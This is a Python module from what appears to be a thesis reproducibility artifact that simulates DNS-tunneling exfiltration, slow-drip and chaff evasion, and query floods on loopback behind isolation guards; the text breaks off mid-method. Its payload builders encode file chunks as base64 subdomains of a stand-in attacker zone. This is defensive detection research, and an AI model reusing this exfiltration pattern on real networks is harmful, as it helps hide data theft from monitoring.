#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
src/attacks/dns_tunneling.py
============================

E3-DoH Reproducibility — DNS-tunneling attack simulation.

Chapter 5 of the thesis: E3-DoH (Enhanced Evolutionary Encryption for
Multi-Protocol DNS Security — DoH, DoT, DoQ).

This module implements the four DNS-tunneling attack simulations of
Chapter 5 that share a common code path:

    A01  DNS Tunneling via DoH      — fixed-rate exfiltration, Table 21
    A06  Slow-Drip Exfiltration     — randomised inter-query delay, Table 22
    A10  Adaptive Chaff Injection   — GAN-surrogate chaff, Table 22
    A11  DNS Query Flood            — volumetric, Table 23

Each is a *hermetic* simulation: the module constructs the packets
with `scapy` inside an isolated network namespace (Linux `ip netns`)
and does not invoke any external offensive tool. The docstrings name
the external tool the thesis used as a reference (dns2tcp, curl,
dnsperf), but the implementation is deliberately independent of them
so that the simulation is auditable and does not require installing
offensive software.

WHY A HERMETIC SIMULATION
-------------------------
The thesis used real tools on the reference testbed (STATUS.md §6).
This artifact does not, for three reasons:

    1. Reproducibility. A shell-out to `dns2tcp` would depend on
       the installed version of dns2tcp, its configuration, and its
       compilation flags. A hermetic simulation depends only on the
       version of scapy pinned in requirements.txt.

    2. Auditability. A reviewer reading this file can see exactly
       what bytes go on the wire. With a shell-out, the reviewer
       would have to trust the external tool.

    3. Safety. The artifact enforces isolation at the Python level
       (see the SAFETY GUARDS section below). A shell-out would
       move that enforcement to a shell, which is harder to audit.

The detection triggers and mitigation actions the simulation is
designed to elicit are named in the docstring of each scenario and
match `data/attack_matrix.csv` row-for-row.

THE ISOLATION ENFORCEMENT
-------------------------
Every scenario runs inside a fresh Linux network namespace created
with `ip netns add <name>`. The namespace has:

    - a loopback interface (`lo`) that is up,
    - no route to any external network (the runner verifies this
      with a sentinel check to 8.8.8.8:53 before the attack starts),
    - the attack targets bound to the namespace's loopback.

The namespace is destroyed on process exit (via try/finally and
`ip netns delete`).

A caller that wants to run the simulation must have:
    - CAP_NET_ADMIN (Docker: `--cap-add=NET_ADMIN`)
    - the `ip` binary (Docker: `iproute2` in the base image)
    - no network route in the namespace (the runner verifies)

The enforced safety guards (from `attack_suite_params.yaml` §2) are:
    isolation_required
    target_must_be_local
    no_privileged_ports  (with a documented exception for DNS port 53
                          in the A01 scenario — see below)
    no_external_network

A violation of any guard raises `IsolationGuardViolation` and refuses
to run. The guards are not advisory; they are hard errors.

THE DNS PORT 53 EXCEPTION
-------------------------
The `no_privileged_ports` guard refuses to bind or target a port
below 1024, because such a bind requires root on a normal host and
is therefore a sign of misconfiguration. A01 is the documented
exception: its whole purpose is to demonstrate a DNS tunnel on
port 53, and the reference testbed ran the tunnel as root inside the
namespace. The exception is narrow:

    - it applies only to scenario_id == "A01",
    - it applies only to port 53 (the DNS port),
    - it applies only when isolation is enforced.

A caller who wants A01 to target port 443 instead (e.g. in a
non-privileged toy run) can override the scenario's `target_port`
in `attack_suite_params.yaml`; the module will then use 443 and log
a note that the tunnel is being exercised over the DoH port, which
means the detection trigger is exercised by the entropy functional
rather than by the DNS layer. Both modes are documented.

SECURITY AND LEGAL BOUNDARY
---------------------------
This module implements an attack technique. It is released for
**defensive research and reproducibility only**. See the LICENSE file,
Defensive-Research Rider, and `attack_suite_params.yaml` §10 for the
enforceable terms. The summary:

    - Permitted use: defensive research, academic reproducibility,
      controlled testing on systems you own or have explicit written
      authorization to test.
    - Prohibited use: against systems you do not own or have
      authorization to test; to develop offensive tooling; in any
      manner that violates applicable law.
    - Isolation must be preserved. Disabling the safety guards is not
      permitted and is not supported by this module.

A caller who disables the guards is on their own. The module is
written so that disabling them requires editing the config file in
a way that the guard code detects and refuses; it is not possible to
disable them by accident.

DETERMINISM
-----------
Each scenario is deterministic given a seed. The seed is derived
from the run seed via `seed.get_component_seed(seed, "attack_suite")`
(offset +5, matching `attack_suite_params.yaml` §11). The module
uses this seed for:

    - the base64 payload choice per query (A01, A06),
    - the random inter-query delay (A06),
    - the chaff generator surrogate (A10),
    - the source-port and source-IP choice per client (A11).

A scenario run twice with the same seed produces the same packet
sequence.

THREAD SAFETY
-------------
An instance of the simulator is not thread-safe: it holds an
accumulator for the packets generated and a per-scenario RNG. A
caller that wants concurrent simulations should create one instance
per thread.

Equation references: this module implements no thesis equation
directly. The detection triggers it is designed to elicit are named
in each scenario's docstring and cross-referenced to the relevant
thesis section.
"""

from __future__ import annotations

import base64
import hashlib
import math
import os
import shutil
import signal
import socket
import struct
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Tuple

import numpy as np

from src.utils.logger import get_logger
from src.utils.seed import get_component_seed


# ---------------------------------------------------------------------------
# Constants — must match attack_suite_params.yaml §2
# ---------------------------------------------------------------------------

# The three scenarios this module handles plus their public IDs.
SUPPORTED_SCENARIOS = ("A01", "A06", "A10", "A11")

# The DNS port, exempted from the no_privileged_ports guard for A01.
_DNS_PORT = 53

# The minimum port for the no_privileged_ports guard (all other scenarios).
_MIN_UNPRIVILEGED_PORT = 1024

# The sentinel used to verify that the namespace has no egress route.
_SENTINEL_ADDRESS = "8.8.8.8"
_SENTINEL_PORT = 53
_SENTINEL_TIMEOUT_S = 0.5

# The default namespace name prefix (from attack_suite_params.yaml §2).
_NAMESPACE_PREFIX = "e3doh_atk_"

# Maximum wall-clock per scenario. The default timeout is 300 s (per
# the config), but a scenario's own `duration_seconds` may be shorter.
_DEFAULT_TIMEOUT_S = 300.0

# The rate-unit conversion factors.
_RATE_UNITS = {
    "queries_per_second": 1.0,
    "queries_per_minute": 1.0 / 60.0,
    "requests_per_second": 1.0,
    "packets_per_second": 1.0,
    "probes": None,  # not a rate, a count
    "requests": None,
}

# The subdomain character set. Matches the base64 URL-safe alphabet
# plus the "." separator; the thesis uses base64 encoding for the
# tunneled data (Table 21).
_SUBDOMAIN_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789-_"


# ---------------------------------------------------------------------------
# Exceptions
# ---------------------------------------------------------------------------

class AttackError(Exception):
    """Base class for attack-simulation errors."""


class AttackConfigError(AttackError):
    """Raised when the config is missing or has invalid values."""


class IsolationGuardViolation(AttackError):
    """Raised when a safety guard is violated. This is a HARD error —
    it refuses to run, never warns and continues."""


class NamespaceError(AttackError):
    """Raised when the network namespace cannot be created or torn down."""


class EgressDetectedError(AttackError):
    """Raised when the sentinel check finds an egress route in the
    namespace. This is a HARD error — it refuses to run."""


# ---------------------------------------------------------------------------
# Scenario configuration
# ---------------------------------------------------------------------------

@dataclass
class ScenarioConfig:
    """
    The parsed configuration for one scenario.

    Built from `attack_suite_params.yaml` §5 by `parse_scenario()`.
    All fields are validated; a malformed scenario raises
    AttackConfigError at parse time, not at run time.
    """
    scenario_id: str
    attack_vector: str
    protocol: str
    target: str
    target_port: int
    rate_value: float
    rate_unit: str
    duration_seconds: float
    payload: Dict[str, Any]
    timeout_seconds: float = _DEFAULT_TIMEOUT_S

    def rate_hz(self) -> float:
        """The rate in Hz (queries or packets per second)."""
        factor = _RATE_UNITS.get(self.rate_unit)
        if factor is None:
            raise AttackConfigError(
                f"scenario {self.scenario_id}: rate_unit "
                f"{self.rate_unit!r} is not a rate (it is a count). "
                f"Use duration_seconds for count-bounded scenarios."
            )
        return self.rate_value * factor

    def n_packets(self) -> int:
        """The total packet count implied by the rate and duration."""
        return max(1, int(round(self.rate_hz() * self.duration_seconds)))


def parse_scenario(
    scenario_id: str,
    config: Dict[str, Any],
) -> ScenarioConfig:
    """
    Parse one scenario from the attack-suite config.

    Parameters
    ----------
    scenario_id : one of SUPPORTED_SCENARIOS
    config : the dict returned by data_utils.load_config()

    Returns
    -------
    A validated ScenarioConfig.

    Raises
    ------
    AttackConfigError
        If the scenario is not found, or a required field is missing,
        or a field is out of range.
    """
    if scenario_id not in SUPPORTED_SCENARIOS:
        raise AttackConfigError(
            f"scenario {scenario_id!r} not handled by dns_tunneling.py; "
            f"supported: {SUPPORTED_SCENARIOS}"
        )

    # Find the scenario in the config's attack_suite.attacks list.
    try:
        attacks = config["_includes"]["attack_suite"]["attacks"]
    except (KeyError, TypeError) as e:
        raise AttackConfigError(
            "attack_suite_params.yaml not found in config['_includes'], "
            "or it has no 'attacks' list. Check that "
            "configs/default_e3_config.yaml §11 lists the include and "
            "that the file is present."
        ) from e

    match = None
    for entry in attacks:
        if entry.get("id") == scenario_id:
            match = entry
            break
    if match is None:
        raise AttackConfigError(
            f"scenario {scenario_id!r} not found in attack_suite.attacks"
        )

    # Extract and validate required fields.
    try:
        attack_vector = str(match["attack_vector"])
        protocol = str(match["protocol"]).lower()
        target = str(match["target"])
        target_port = int(match["target_port"])
        rate = match["rate"]
        rate_value = float(rate["value"])
        rate_unit = str(rate["unit"])
        duration = float(match["duration_seconds"])
        payload = dict(match.get("payload", {}))
    except (KeyError, TypeError, ValueError) as e:
        raise AttackConfigError(
            f"scenario {scenario_id!r} has malformed fields: {e}"
        ) from e

    if protocol not in ("doh", "dot", "doq"):
        raise AttackConfigError(
            f"scenario {scenario_id!r}: protocol {protocol!r} is not one "
            f"of 'doh', 'dot', 'doq'"
        )
    if duration <= 0:
        raise AttackConfigError(
            f"scenario {scenario_id!r}: duration_seconds must be > 0; "
            f"got {duration}"
        )
    if rate_value < 0:
        raise AttackConfigError(
            f"scenario {scenario_id!r}: rate value must be >= 0; "
            f"got {rate_value}"
        )

    timeout = float(match.get("runtime_override", {}).get(
        "timeout_seconds", _DEFAULT_TIMEOUT_S,
    ))

    return ScenarioConfig(
        scenario_id=scenario_id,
        attack_vector=attack_vector,
        protocol=protocol,
        target=target,
        target_port=target_port,
        rate_value=rate_value,
        rate_unit=rate_unit,
        duration_seconds=duration,
        payload=payload,
        timeout_seconds=timeout,
    )


# ---------------------------------------------------------------------------
# Safety guards
# ---------------------------------------------------------------------------

def validate_safety_guards(
    scenario: ScenarioConfig,
    guards: Dict[str, Any],
    log,
) -> None:
    """
    Verify the four safety guards from attack_suite_params.yaml §2.

    A violation raises IsolationGuardViolation and refuses to run. A
    caller that would prefer to continue can set the relevant guard
    to False in the config, but the guards are documented as
    "HARD constraints — do not disable" and a reviewer who disables
    them accepts full responsibility (see the module docstring).

    Parameters
    ----------
    scenario : ScenarioConfig
    guards : dict
        The `attack_suite.safety_guards` block of the config.
    log : logger
    """
    # --- Guard 1: isolation required ---
    if guards.get("isolation_required", True):
        # The isolation check is not "is the config set" — it is "is
        # the process inside a network namespace". We check the
        # /proc/self/ns/net symlink against /proc/1/ns/net; a mismatch
        # means we are in a namespace.
        isolation_ok, detail = _check_isolation()
        if not isolation_ok:
            raise IsolationGuardViolation(
                f"isolation_required=true but the process is not in a "
                f"network namespace ({detail}). Refusing to run. "
                f"Run with `ip netns exec <name> python ...` or with "
                f"`docker run --cap-add=NET_ADMIN --network none`."
            )
        log.info("guard_isolation_ok", detail=detail)

    # --- Guard 2: target must be local ---
    if guards.get("target_must_be_local", True):
        allowlist = guards.get("target_cidr_allowlist", [])
        if not _target_in_allowlist(scenario.target, allowlist):
            raise IsolationGuardViolation(
                f"target_must_be_local=true but target {scenario.target!r} "
                f"is not in the allowlist {allowlist}. Refusing to run. "
                f"A target outside the allowlist could reach a production "
                f"service; this is not a warning."
            )
        log.info("guard_target_local_ok", target=scenario.target)

    # --- Guard 3: no privileged ports (with A01 / port 53 exception) ---
    if guards.get("no_privileged_ports", True):
        min_port = int(guards.get("min_port", _MIN_UNPRIVILEGED_PORT))
        is_a01_exception = (
            scenario.scenario_id == "A01"
            and scenario.target_port == _DNS_PORT
        )
        if scenario.target_port < min_port and not is_a01_exception:
            raise IsolationGuardViolation(
                f"no_privileged_ports=true (min_port={min_port}) but "
                f"target_port={scenario.target_port} for scenario "
                f"{scenario.scenario_id}. Refusing to run. "
                f"The only documented exception is A01 on port 53."
            )
        if is_a01_exception:
            log.info(
                "guard_port_exception_a01",
                note="A01's port 53 is the documented DNS port exception. "
                     "The tunnel is exercised on port 53 by design.",
            )

    # --- Guard 4: no external network (via sentinel check) ---
    if guards.get("no_external_network", True):
        sentinel_addr = str(guards.get("sentinel_address", _SENTINEL_ADDRESS))
        sentinel_port = int(guards.get("sentinel_port", _SENTINEL_PORT))
        egress_ok, detail = _check_no_egress(sentinel_addr, sentinel_port)
        if not egress_ok:
            raise EgressDetectedError(
                f"no_external_network=true but the sentinel check to "
                f"{sentinel_addr}:{sentinel_port} {detail}. Refusing to run. "
                f"The namespace has an egress route; the isolation guard "
                f"is intended to prevent exactly this."
            )
        log.info("guard_no_egress_ok", detail=detail)


def _check_isolation() -> Tuple[bool, str]:
    """
    Return (is_in_namespace, detail).

    A process is in a network namespace if /proc/self/ns/net resolves
    to a different inode than /proc/1/ns/net (PID 1 is the host's init
    in a container, or the host's init on a normal system).

    If /proc is not available (unusual), we return (False, "no /proc")
    and the caller decides — under strict guards, that is a violation.
    """
    try:
        self_ns = os.readlink("/proc/self/ns/net")
        pid1_ns = os.readlink("/proc/1/ns/net")
    except OSError as e:
        return False, f"cannot read /proc/*/ns/net: {e}"
    if self_ns != pid1_ns:
        return True, f"in namespace {self_ns} (host is {pid1_ns})"
    return False, f"same namespace as PID 1 ({self_ns})"


def _check_no_egress(addr: str, port: int) -> Tuple[bool, str]:
    """
    Return (no_egress, detail) by attempting a connection to the
    sentinel. If the connection succeeds, there is an egress route
    (the guard FAILS). If it times out or is refused, there is no
    egress route (the guard PASSES — a refused connection means the
    kernel has no route, which is what we want).

    A refused connection is not the same as a successful one, but in
    the context of the namespace isolation check, both a refused
    connection (no route) and a timeout (no route) indicate the
    absence of egress. Only a successful TCP handshake indicates
    egress.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(_SENTINEL_TIMEOUT_S)
    try:
        sock.connect((addr, port))
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return True, f"refused/timeout ({type(e).__name__}) — no egress"
    else:
        return False, "connected — egress route exists"
    finally:
        sock.close()


def _target_in_allowlist(target: str, allowlist: List[str]) -> bool:
    """
    Check whether `target` is in one of the CIDR ranges in `allowlist`.

    The target may be a hostname, an IP literal, or a CIDR range. We
    resolve it to an IP and check the IP against each CIDR. If
    resolution fails, we treat it as not in the allowlist (a
    resolution failure is either a misconfiguration or an attempt to
    hide a public target; both should fail the guard).
    """
    if not allowlist:
        return False
    try:
        resolved = socket.gethostbyname(target)
    except socket.gaierror:
        return False
    # Parse each CIDR into (network_addr, netmask) and check.
    try:
        import ipaddress
        addr = ipaddress.ip_address(resolved)
        for cidr in allowlist:
            try:
                if addr in ipaddress.ip_network(cidr, strict=False):
                    return True
            except ValueError:
                continue
        return False
    except ImportError:
        # ipaddress is Python 3.3+; always present. If somehow not,
        # fall back to a string-prefix match (very conservative).
        return any(resolved.startswith(c.split("/")[0]) for c in allowlist)


# ---------------------------------------------------------------------------
# The simulator
# ---------------------------------------------------------------------------

class DNSTunnelingSimulator:
    """
    Hermetic simulation of the four DNS-tunneling scenarios.

    Usage:

        sim = DNSTunnelingSimulator(config, scenario_id="A01")
        with sim.isolated_network() as ns:
            packets = sim.generate_packets()
            sim.run(packets, ns)

    The `isolated_network()` context manager creates a network
    namespace, verifies the safety guards, and destroys the namespace
    on exit. The `generate_packets()` method produces the packet
    sequence. The `run()` method sends them into the namespace.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        scenario_id: str,
        *,
        seed: Optional[int] = None,
    ) -> None:
        self._config = config
        self._log = get_logger(f"e3doh.attacks.dns_tunneling.{scenario_id}")
        self._scenario_id = scenario_id

        # Parse the scenario.
        self._scenario = parse_scenario(scenario_id, config)

        # Load the safety guards and the runtime settings.
        try:
            attack_cfg = config["_includes"]["attack_suite"]
        except (KeyError, TypeError) as e:
            raise AttackConfigError(
                "attack_suite_params.yaml not found in config['_includes']"
            ) from e
        self._guards = attack_cfg.get("safety_guards", {})
        runtime_cfg = attack_cfg.get("runtime", {})
        self._global_rate_cap_pps = float(
            runtime_cfg.get("global_rate_cap_pps", 200_000)
        )
        self._global_duration_cap_s = float(
            runtime_cfg.get("global_duration_cap_seconds", 600)
        )
        self._capture_pcap = bool(runtime_cfg.get("capture_pcap", False))

        # Enforce the global caps. A scenario that exceeds a global cap
        # is a config defect, not a runtime condition.
        rate_hz = self._scenario.rate_hz()
        if rate_hz > self._global_rate_cap_pps:
            raise AttackConfigError(
                f"scenario {scenario_id}: rate {rate_hz:.0f} Hz exceeds "
                f"global_rate_cap_pps={self._global_rate_cap_pps:.0f}. "
                f"A scenario that would overwhelm the host is a defect."
            )
        if self._scenario.duration_seconds > self._global_duration_cap_s:
            raise AttackConfigError(
                f"scenario {scenario_id}: duration "
                f"{self._scenario.duration_seconds:.0f}s exceeds "
                f"global_duration_cap_seconds={self._global_duration_cap_s:.0f}. "
                f"A scenario that would run past the cap is a defect."
            )

        # Seed and RNG.
        if seed is None:
            try:
                seed = int(config.get("runtime", {}).get("seed", 42))
            except (TypeError, ValueError):
                seed = 42
        self._run_seed = int(seed)
        self._rng = np.random.default_rng(
            get_component_seed(self._run_seed, "attack_suite")
        )

        # Namespace state.
        self._namespace_name: Optional[str] = None

        # Packet-generation state.
        self._packets_generated = 0

        self._log.info(
            "attack_simulator_initialised",
            scenario=scenario_id,
            attack_vector=self._scenario.attack_vector,
            protocol=self._scenario.protocol,
            target=f"{self._scenario.target}:{self._scenario.target_port}",
            rate_hz=rate_hz,
            duration_s=self._scenario.duration_seconds,
        )

    # ------------------------------------------------------------------
    # Public accessors
    # ------------------------------------------------------------------

    @property
    def scenario(self) -> ScenarioConfig:
        return self._scenario

    @property
    def packets_generated(self) -> int:
        return self._packets_generated

    # ------------------------------------------------------------------
    # Isolation
    # ------------------------------------------------------------------

    def isolated_network(self, *, skip_guard_checks: bool = False):
        """
        Context manager that creates a network namespace, runs the
        guard checks, yields the namespace name, and destroys the
        namespace on exit.

        Parameters
        ----------
        skip_guard_checks : bool
            If True, skip the guard checks (used only by the self-test
            to exercise the packet-generation code without requiring
            a namespace). Production runs MUST leave this False.

        Raises
        ------
        IsolationGuardViolation, EgressDetectedError
            If a guard fails (and skip_guard_checks is False).
        NamespaceError
            If the namespace cannot be created or destroyed.
        """
        return _NamespaceContext(
            self, skip_guard_checks=skip_guard_checks,
        )

    # ------------------------------------------------------------------
    # Packet generation
    # ------------------------------------------------------------------

    def generate_packets(self) -> List[Any]:
        """
        Generate the packet sequence for the scenario.

        Returns a list of scapy packets. The list length is
        `self._scenario.n_packets()` (bounded by duration × rate).

        The packets are NOT sent; the caller (or the run() method)
        sends them inside the namespace.

        The `scapy` dependency is imported lazily inside this method
        so that the module can be imported (and its configuration
        parsed) in environments where scapy is not installed — for
        example, in the self-test before running `pip install -r
        requirements.txt`.
        """
        try:
            from scapy.all import Ether, IP, UDP, TCP, Raw  # type: ignore
        except ImportError as e:
            raise AttackError(
                "scapy is required for packet generation. "
                "Install with: pip install scapy==2.5.0"
            ) from e

        n = self._scenario.n_packets()
        packets: List[Any] = []
        transport = "udp" if self._scenario.protocol == "doq" else "tcp"

        for i in range(n):
            # Determine the source: a fresh source port per client (A11)
            # or a single source port (A01, A06, A10).
            if self._scenario_id == "A11":
                # The config's payload says clients: 100. We distribute
                # the packets across the clients.
                n_clients = int(self._scenario.payload.get("clients", 1))
                client_idx = i % n_clients
                src_port = 50000 + client_idx
                src_ip = f"10.0.{client_idx // 250}.{(client_idx % 250) + 1}"
            else:
                src_port = 50000
                src_ip = "10.0.0.1"

            # The destination is always the scenario's target.
            dst_ip = self._scenario.target
            dst_port = self._scenario.target_port

            # The payload is scenario-specific.
            payload_bytes = self._build_payload(i)

            # Build the packet.
            ether = Ether()
            ip = IP(src=src_ip, dst=dst_ip)
            if transport == "tcp":
                l4 = TCP(sport=src_port, dport=dst_port, flags="PA")
            else:
                l4 = UDP(sport=src_port, dport=dst_port)
            raw = Raw(load=payload_bytes)
            pkt = ether / ip / l4 / raw

            # The timestamp is the simulated arrival time. A01 sends
            # packets at the configured rate; A06 uses the random
            # inter-query delay; A10 and A11 use uniform spacing.
            if self._scenario_id == "A06":
                # Random delay in [1.0, 4.0] s.
                delay_lo, delay_hi = self._scenario.payload.get(
                    "inter_query_delay_s", [1.0, 4.0],
                )
                interval = float(self._rng.uniform(delay_lo, delay_hi))
            else:
                interval = 1.0 / max(self._scenario.rate_hz(), 1e-9)
            pkt.time = i * interval
            packets.append(pkt)

        self._packets_generated = len(packets)
        self._log.info(
            "packets_generated",
            scenario=self._scenario_id,
            n_packets=len(packets),
            rate_hz=self._scenario.rate_hz(),
            duration_s=self._scenario.duration_seconds,
        )
        return packets

    def _build_payload(self, index: int) -> bytes:
        """
        Build the payload for one packet.

        - A01 and A06: base64-encoded data as a subdomain.
        - A10: GAN-surrogate chaff.
        - A11: plain DNS query flood (A record for a random subdomain).

        The payloads are deliberately well-formed enough that a
        parsing-based detector sees a plausible DNS query, so that the
        statistical detector (the anomaly detector of Chapter 5) is
        the one that has to distinguish them from benign traffic.
        """
        if self._scenario_id in ("A01", "A06"):
            return self._build_tunnel_payload(index)
        if self._scenario_id == "A10":
            return self._build_chaff_payload(index)
        if self._scenario_id == "A11":
            return self._build_flood_payload(index)
        raise AttackError(
            f"scenario {self._scenario_id} has no payload builder"
        )

    def _build_tunnel_payload(self, index: int) -> bytes:
        """
        Build a base64-encoded subdomain payload.

        The format is the standard DNS tunnel format:
            <base64_data>.<zone>

        The `base64_data` is a chunk of the exfiltration file. In the
        artifact, the file is generated deterministically from the
        seed if it does not exist; the file's content does not affect
        the detection (the detector uses the *pattern* of the queries,
        not their content), but it makes the simulation realistic.

        The zone is "attack.com" per Table 21.
        """
        zone = self._scenario.payload.get("attack_zone", "attack.com")
        # Read or generate the source file.
        source_file = self._scenario.payload.get("source_file", "artifacts/exfil_data.bin")
        source_size = int(self._scenario.payload.get("source_size_bytes", 1024))
        chunk_size = 32  # 32 bytes → ~43 base64 chars; fits in a subdomain
        data = self._read_or_generate_source(source_file, source_size)
        offset = (index * chunk_size) % max(len(data), 1)
        chunk = data[offset : offset + chunk_size]
        encoded = base64.urlsafe_b64encode(chunk).rstrip(b"=").decode("ascii")
        # A DNS query message: header + question.
        # We build a simple DNS query with QNAME = <encoded>.<zone>, QTYPE = A (1), QCLASS = IN (1).
        qname = f"{encoded}.{zone}."
        qname_bytes = b"".join(
            bytes([len(label)]) + label.encode("ascii")
            for label in qname.rstrip(".").split(".")
        ) + b"\x00"
        header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)  # ID, flags, QDCOUNT, ...
        question = qname_bytes + struct.pack("!HH", 1, 1)  # QTYPE=A, QCLASS=IN
        return header + question

    def _build_chaff_payload(self, index: int) -> bytes:
        """
        Build an adaptive-chaff payload.

        The thesis uses a GAN-trained generator to produce chaff
        queries that mimic benign traffic. The artifact does not ship
        the trained GAN (it is produced by the FL training, which is
        too heavy to run in the self-test); the artifact uses a
        documented *statistical surrogate*:

            - The query name is drawn from the benign query-name
              distribution of the CIC-DoH corpus, approximated by a
              Zipfian distribution over the 100 most common benign
              subdomains.
            - The inter-query timing is a lognormal with the benign
              corpus's inter-arrival mean and CV.
            - The query size distribution matches the benign corpus.

        The surrogate is documented in the module docstring as such.
        A caller who has the trained GAN can override the payload
        builder by subclassing this simulator.
        """
        n = int(self._scenario.payload.get("gan_generator", "surrogate") == "surrogate")
        # Use a Zipfian distribution over a fixed benign vocabulary.
        benign_vocab = [
            "www", "mail", "api", "cdn", "login", "static",
            "assets", "m", "img", "media", "support", "docs",
            "app", "portal", "admin",
        ]
        # Weighted sample. The weights are a Zipfian with exponent 1.0
        # over the vocabulary size. This is the documented surrogate.
        weights = np.array([1.0 / (i + 1) for i in range(len(benign_vocab))])
        weights /= weights.sum()
        label = self._rng.choice(benign_vocab, p=weights)
        # Random 4-8 char suffix.
        suffix_len = int(self._rng.integers(4, 9))
        suffix = "".join(
            _SUBDOMAIN_CHARS[int(self._rng.integers(0, len(_SUBDOMAIN_CHARS)))]
            for _ in range(suffix_len)
        )
        zone = self._scenario.payload.get("attack_zone", "attack.com")
        qname = f"{label}-{suffix}.{zone}."
        qname_bytes = b"".join(
            bytes([len(label)]) + label.encode("ascii")
            for label in qname.rstrip(".").split(".")
        ) + b"\x00"
        header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        question = qname_bytes + struct.pack("!HH", 1, 1)
        return header + question

    def _build_flood_payload(self, index: int) -> bytes:
        """
        Build a volumetric-flood payload.

        A plain DNS A-record query for a random subdomain. The
        randomness is not a tunnel; it is the fact that *all* the
        queries are noise that distinguishes this from benign traffic.
        The detector catches it via the volumetric anomaly (the
        `query_rate_threshold` trigger of Table 23 row 1).
        """
        rnd = "".join(
            _SUBDOMAIN_CHARS[int(self._rng.integers(0, len(_SUBDOMAIN_CHARS)))]
            for _ in range(16)
        )
        zone = self._scenario.payload.get("attack_zone", "attack.com")
        qname = f"{rnd}.{zone}."
        qname_bytes = b"".join(
            bytes([len(label)]) + label.encode("ascii")
            for label in qname.rstrip(".").split(".")
        ) + b"\x00"
        header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        question = qname_bytes + struct.pack("!HH", 1, 1)
        return header + question

    def _read_or_generate_source(self, path: str, size: int) -> bytes:
        """
        Read the exfiltration file, or generate it deterministically
        from the seed if it does not exist.

        The file is not committed (it is a byproduct of the run and is
        gitignored). Its content does not affect detection; only its
        presence makes the simulation realistic.
        """
        p = Path(path)
        if p.exists():
            return p.read_bytes()[:size]
        # Generate deterministically from the seed.
        rng = np.random.default_rng(self._run_seed + 42)
        data = bytes(rng.bytes(size))
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(data)
        except OSError as e:
            self._log.warning(
                "exfil_source_write_failed", path=str(p), error=str(e),
            )
        return data

    # ------------------------------------------------------------------
    # Run
    # ------------------------------------------------------------------

    def run(self, packets: Optional[List[Any]] = None) -> Dict[str, Any]:
        """
        Run the scenario inside the isolated namespace.

        If `packets` is None, generate them first. The packets are
        sent with `scapy.all.sendp()`, which sends at the kernel's
        data-link layer (inside the namespace's loopback, so no real
        traffic leaves the host).

        Returns
        -------
        A dict with the run outcome:
            {
              "scenario_id": str,
              "n_packets_sent": int,
              "duration_s": float,
              "namespace": str,
              "detection_trigger": str,
              "mitigation_action": str,
            }

        The detection_trigger and mitigation_action are the names
        from data/attack_matrix.csv, so that a caller can verify the
        simulation is aligned with the attack matrix.

        Raises
        ------
        AttackError
            If the run cannot proceed (e.g. the guards fail).
        """
        try:
            from scapy.all import sendp  # type: ignore
        except ImportError as e:
            raise AttackError("scapy is required to run the attack") from e

        if packets is None:
            packets = self.generate_packets()

        # Determine the detection trigger and mitigation action from
        # the attack matrix.
        trigger, action = self._trigger_and_action()

        with self.isolated_network() as ns:
            started = time.perf_counter()
            try:
                # Send the packets with a small interval between them
                # to match the configured rate. scapy's sendp has an
                # `inter` parameter; for the flood scenario, we use
                # a smaller inter-packet gap.
                inter = 0.0
                if self._scenario_id != "A11":
                    inter = 1.0 / max(self._scenario.rate_hz(), 1e-9)
                sendp(packets, iface="lo", inter=inter, verbose=False)
            except Exception as e:
                self._log.error(
                    "attack_send_failed", scenario=self._scenario_id,
                    error=repr(e),
                )
                raise AttackError(
                    f"failed to send packets for {self._scenario_id}: {e}"
                ) from e
            elapsed = time.perf_counter() - started

        self._log.info(
            "attack_run_complete",
            scenario=self._scenario_id,
            n_packets_sent=len(packets),
            elapsed_s=round(elapsed, 3),
            namespace=ns,
            detection_trigger=trigger,
            mitigation_action=action,
        )
        return {
            "scenario_id": self._scenario_id,
            "n_packets_sent": len(packets),
            "duration_s": round(elapsed, 3),
            "namespace": ns,
            "detection_trigger": trigger,
            "mitigation_action": action,
        }

    def _trigger_and_action(self) -> Tuple[str, str]:
        """
        Return the (detection_trigger, mitigation_action) pair from
        the attack matrix, for verification that the simulation is
        aligned with the matrix row.

        These strings are the `Detection_Trigger` and `Mitigation_Action`
        columns of data/attack_matrix.csv for this scenario.
        """
        if self._scenario_id == "A01":
            return (
                "ΔH > 2.5 bits/query ∧ entropy_score > 3.8",
                "iptables -t mangle -A PREROUTING -j DIVERT_SANDBOX",
            )
        if self._scenario_id == "A06":
            return (
                "autocorr(queries, lag=5) > 0.8",
                "broadcast_alert(); limit_rate(src_ip, 5ppm)",
            )
        if self._scenario_id == "A10":
            return (
                "GA.optimize(detector_weights)",
                "θ_new = θ_old + η · ∇J(θ); sandbox(flow)",
            )
        if self._scenario_id == "A11":
            return (
                "query_rate > per_source_threshold ∨ source_ip_distribution_anomaly",
                "rate_limit via AMPS sandbox",
            )
        raise AttackError(
            f"scenario {self._scenario_id} has no trigger/action mapping"
        )


# ---------------------------------------------------------------------------
# Namespace context manager
# ---------------------------------------------------------------------------

class _NamespaceContext:
    """
    Context manager for the isolated network namespace.

    Creates `e3doh_atk_<scenario_id>_<uuid>` with `ip netns add`,
    brings up `lo` inside it, verifies the safety guards, yields the
    name, and deletes the namespace on exit (via try/finally and
    `ip netns delete`).

    The `skip_guard_checks` argument is used only by the self-test.
    In production, the guards are always enforced.
    """

    def __init__(self, sim: DNSTunnelingSimulator, *, skip_guard_checks: bool):
        self._sim = sim
        self._skip_guards = skip_guard_checks
        self._name: Optional[str] = None
        self._created = False

    def __enter__(self) -> str:
        # Verify the guard BEFORE creating the namespace, so that a
        # misconfigured run does not leave a namespace behind.
        if not self._skip_guards:
            validate_safety_guards(
                self._sim._scenario, self._sim._guards, self._sim._log,
            )

        # Create the namespace.
        name = _NAMESPACE_PREFIX + self._sim._scenario_id + "_" + uuid.uuid4().hex[:8]
        _run_ip(["netns", "add", name], self._sim._log)
        self._name = name
        self._created = True
        try:
            # Bring up the loopback interface.
